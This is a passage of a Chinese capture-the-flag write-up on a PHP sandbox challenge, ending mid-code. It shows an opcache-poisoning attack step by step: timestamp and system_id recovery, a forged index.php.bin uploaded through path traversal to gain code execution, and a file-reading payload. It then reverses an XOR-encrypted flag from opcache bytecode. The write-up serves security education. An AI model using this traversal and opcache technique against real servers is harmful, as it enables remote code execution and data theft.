* 
#### 入口代码审计
     100000) {
          clear($dir);
          break;
        }
        $name = $dir . $_GET["name"];
        if (preg_match("/[^a-zA-Z0-9.\/]/", $name) ||
          stristr(pathinfo($name)["extension"], "h")) {
          break;
        }
        move_uploaded_file($_FILES['file']['tmp_name'], $name);
        $size = 0;
        foreach (scandir($dir) as $file) {
          if (in_array($file, [".", ".."])) {
            continue;
          }
          $size += filesize($dir . $file);
        }
        if ($size > 100000) {
          clear($dir);
        }
        break;
      case 'shell':
        ini_set("open_basedir", "/var/www/html/$dir:/var/www/html/flag");
        include $dir . "index.php";
        break;
      default:
        highlight_file(__FILE__);
        break;
    }
  * `upload`参数上传的文件可以跳路径。
  * 触发代码执行的点只有`shell`参数，意味着我们要控制`index.php`的内容。
#### 思路
如何在`index.php`已经存在的情况下，覆盖该文件逻辑，并绕过php后缀过滤。
  * 
这个思路出过比赛，这里使用`action=phpinfo`参数查看配置，果然开启了opcache，但和以往题目不同的是，环境对cache的timestamp做了验证`validate_timestamps
= 1`。
幸运的是上面链接仍然给出了bypass timestamp的方法，即获取到文件创建时的timestamp，然后写到cache的bin里面。
此外，再获取到目标环境的system_id，即可构造出可用的恶意opcache。
#### 获取timestamp
注意到开始的php代码中有两个参数：
  * time：获取当前timestamp
  * reset：删除当前目录下文件
二者结合即可精确拿到timestamp
    import requests
    print requests.get('http://202.120.7.217:9527/index.php?action=time').content
    print requests.get('http://202.120.7.217:9527/index.php?action=reset').content
    print requests.get('http://202.120.7.217:9527/index.php?action=time').content
运行后1和3的结果一致。
#### 获取system_id
上文链接中给出的github项目给出了system_id的生成代码：
  * 
所需的数据均可从phpinfo提取，计算结果：
    PHP version : 7.0.28
    Zend Extension ID : API320151012,NTS
    Zend Bin ID : BIN_SIZEOF_CHAR48888
    Assuming x86_64 architecture
    ------------    System ID : 7badddeddbd076fe8352e80d8ddf3e73
#### 构造恶意opcache
在phpinfo中寻找opcache相关配置，并按照pwd参数的路径，在本地启动一个同版本、同配置、同目录的php项目，然后将index.php内容写入需要执行的代码。
访问之，在/tmp/cache目录生成cache文件，然后将文件导入010editor，将system_id和timestamp两个字段修改为题目数据。
#### 代码执行
然后通过upload参数，配合路径穿越，将`index.php.bin`上传到opcache所在位置(由于`.bin`是后缀，正好绕过了正则)：
    /../../../../../../tmp/cache/7badddeddbd076fe8352e80d8ddf3e73/var/www/sandbox/209a9184b3302dc0ff24bc20b7b8844eab478cb6/index.php.bin
然后请求`shell`参数，当`index.php`被加载时，实际加载的是我们上传的opcache，回显可以看到opcache中php代码执行结果。
#### 文件修复
通过`scandir`发现路径，然后拿到这个bin文件。
    @print_r(file_get_contents('flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228cad'));
看了下可见字符，该文件存在OPCACHE头，是`/var/www/html/flag.php`的opcache文件。但无法正常解析，与正确的文件对了下格式，补全一个`00`即可正常解析。
#### 粗粒度指令还原
使用前文链接github中给出的opcache分析工具，可以还原部分指令。
这个工具要安装旧版本依赖。
    pip install construct==2.8.22
    pip install treelib
    pip install termcolor
    python opcache_disassembler.py -c -a64 ../../flag.php.bin
结果如下（代码里包含了我加的缩进和猜测）：
    function encrypt() {
      #0 !0 = RECV(None, None); //两个接收参数
      #1 !0 = RECV(None, None);
          #2 DO_FCALL_BY_NAME(None, 'mt_srand');   mt_srand(1337)
          #3 SEND_VAL(1337, None);
          #4 (129)?(None, None);
      #5 ASSIGN(!0, '');
      #6 (121)?(!0, None);
      #7 ASSIGN(None, None);
      #8 (121)?(!0, None);
      #9 ASSIGN(None, None);
          #10 ASSIGN(None, 0); for($i
          #11 JMP(->-24, None); 循环开始
              #12 DO_FCALL_BY_NAME(None, 'chr');
                  #13 DO_FCALL_BY_NAME(None, 'ord'); ord($a[$i])
                      #14 FETCH_DIM_R(!0, None);
                      #15 (117)?(None, None);
                  #16 (129)?(None, None);
                  #17 DO_FCALL_BY_NAME(None, 'ord'); ord($b[$i])
                      #18 MOD(None, None);
                          #19 FETCH_DIM_R(!0, None);
                          #20 (117)?(None, None);
                  #21 (129)?(None, None);
                  #22 BW_XOR(None, None);
                  #23 DO_FCALL_BY_NAME(None, 'mt_rand');   mt_rand(0,255)
                      #24 SEND_VAL(0, None);
                      #25 SEND_VAL(255, None);
                  #26 (129)?(None, None);
                  #27 BW_XOR(None, None);
              #28 SEND_VAL(None, None); chr的传参
              #29 (129)?(None, None);
              #30 ASSIGN_CONCAT(!0, None);
          #31 PRE_INC(None, None);      i++
          #32 IS_SMALLER(None, None);   for 条件 i134217662); 循环结束
      #34 DO_FCALL_BY_NAME(None, 'encode');
      #35 (117)?(!0, None);
      #36 (130)?(None, None);
      #37 RETURN(None, None);
    }
    function encode() {
      #0 RECV(None, None);
      #1 ASSIGN(None, '');
      #2 ASSIGN(None, 0);
      #3 JMP(->-81, None);
          #4 DO_FCALL_BY_NAME(None, 'dechex');
              #5 DO_FCALL_BY_NAME(None, 'ord');
                  #6 FETCH_DIM_R(None, None);
                  #7 (117)?(None, None);
              #8 (129)?(None, None);
              #9 (117)?(None, None);
          #10 (129)?(None, None);
      #11 ASSIGN(None, None);
      #12 (121)?(None, None);
      #13 IS_EQUAL(None, 1);
      #14 JMPZ(None, ->-94);
      #15 CONCAT('0', None);
      #16 ASSIGN_CONCAT(None, None);
      #17 JMP(->-96, None);
      #18 ASSIGN_CONCAT(None, None);
      #19 PRE_INC(None, None);
      #20 (121)?(None, None);
      #21 IS_SMALLER(None, None);
      #22 JMPNZ(None, ->134217612);
      #23 RETURN(None, None);
    }
    #0 ASSIGN(None, 'input_your_flag_here');
    #1 DO_FCALL_BY_NAME(None, 'encrypt');
    #2 SEND_VAL('this_is_a_very_secret_key', None);
    #3 (117)?(None, None);
    #4 (130)?(None, None);
    #5 IS_IDENTICAL(None, '85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab');
    #6 JMPZ(None, ->-136);
    #7 ECHO('Congratulation! You got it!', None);
    #8 EXIT(None, None);
    #9 ECHO('Wrong Answer', None);
    #10 EXIT(None, None);
其实这段代码缺失了很多关键信息，在这里Ricter已经准确的瞎j8猜出了逻辑并还原了php代码（膜！），而且写出了逆向加密的代码（XOR可逆，直接把密文输入enc函数再算一遍即可得到明文），如下：
    <?php
    function encrypt() {
        $t = "";
        $s = "\x85\xb9T\xfc\x83\x80\xa4f'nJH$\x9d\xddJ\x19\x9f\xc3N[\x06\x14d\xe4)_\xc5\x02\x0c\x88\xbf\xd8TU\x19\xab";